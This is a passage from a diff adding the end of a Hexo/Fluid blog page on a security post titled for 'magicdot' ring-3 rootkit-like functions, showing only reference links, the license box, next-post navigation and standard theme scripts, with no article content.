+<p><a target="_blank" rel="noopener" href="https://www.safebreach.com/blog/magicdot-a-hackers-magic-show-of-disappearing-dots-and-spaces/">https://www.safebreach.com/blog/magicdot-a-hackers-magic-show-of-disappearing-dots-and-spaces/</a></p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/OVdci4LLUYkVIHZZx8NfiA">https://mp.weixin.qq.com/s/OVdci4LLUYkVIHZZx8NfiA</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Windows%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/" class="print-no-link">#Windows操作系统</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>《magicdot-ring3层的仿rootkit功能》</div>
+      <div>http://example.com/2025/12/22/《magicdot-ring3层的仿rootkit功能》/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>John Doe</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>December 22, 2025</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/10/23/CVE-2025-60749/" title="CVE-2025-60749">
+                        <span class="hidden-mobile">CVE-2025-60749</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
